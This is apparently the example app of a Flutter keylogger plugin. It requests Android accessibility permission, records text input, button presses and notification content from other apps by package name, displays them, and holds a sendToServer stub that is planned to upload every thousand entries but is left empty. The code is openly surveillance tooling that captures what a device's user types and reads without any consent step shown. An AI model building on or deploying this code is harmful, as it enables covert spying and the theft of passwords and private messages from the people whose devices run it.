import 'package:flutter/material.dart';
import 'package:flutterkeylogger/flutterkeylogger.dart';
import 'package:flutterkeylogger_example/constant.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  List<Log> logs = [];
  @override
  void initState() {
    super.initState();
    Keylogger.logs((log) {
      logs.add(log);
      setState(() {});
      if (logs.length % 1000 == 0) {
        sendToServer();
        // after sending you can reset the logs like
        setState(() {
          logs = [];
        });
      }
    });

    Keylogger.isAccessibilityPermissionEnabled().then(
      (enabled) => {
        if (!enabled)
          {
            print("-------------Enable--------------"),
            Keylogger.requestAccessibilityPermission(),
          }
      },
    );
  }

  sendToServer() {
    //TODO:send data to server
  }

  int index = 0;
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData.dark(),
      home: Scaffold(
        appBar: AppBar(
          title: Text('Key | Event Logger'),
          actions: [
            TextButton(
              onPressed: () {},
              child: Text(
                "Logs:" + logs.length.toString(),
                style: TextStyle(fontSize: 24),
              ),
            ),
            IconButton(
              onPressed: () {
                Keylogger.requestAccessibilityPermission();
              },
              icon: Icon(Icons.accessibility),
            ),
          ],
        ),
        bottomNavigationBar: BottomNavigationBar(
          items: [
            BottomNavigationBarItem(
              icon: Icon(Icons.filter),
              label: 'Filtered',
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.whatshot),
              label: 'Raw',
            ),
          ],
          currentIndex: index,
          onTap: (index) {
            setState(() {
              this.index = index;
            });
          },
        ),
        body: IndexedStack(
          index: index,
          children: [
            ListView(
              children: [
                for (var log in logs)
                  if (log.text != "[]")
                    RichText(
                      text: TextSpan(children: [
                        TextSpan(text: log.text, style: TEXTSTYLE),
                        TextSpan(text: getTypeText(log.type), style: TEXTSTYLE2),
                        TextSpan(text: " at " + getTime(log.logTime!), style: TEXTSTYLE2),
                      ], text: log.packageName! + " > "),
                    ),
              ],
            ),
            ListView(
              children: [
                for (var log in logs) ...[
                  RichText(
                    text: TextSpan(children: [
                      TextSpan(
                        text: log.raw,
                        style: TEXTSTYLE,
                      ),
                    ], text: log.packageName! + " " + DateTime.fromMillisecondsSinceEpoch(int.parse(log.logTime!)).toString() + " > "),
                  ),
                  SizedBox(
                    height: 5,
                  )
                ]
              ],
            ),
          ],
        ),
      ),
    );
  }

  // the time during which events occured
  String getTime(String tim) {
    var time = DateTime.fromMillisecondsSinceEpoch(int.parse(tim));
    return time.hour.toString() + ":" + time.minute.toString() + ":" + time.second.toString();
  }

  // the type of the event fired
  String getTypeText(String? type) {
    switch (type) {
      case "TYPE_VIEW_CLICKED":
        return " Button Pressed";
      case "TYPE_NOTIFICATION_STATE_CHANGED":
        return " Notification Data";
      default:
        return "";
    }
  }
}
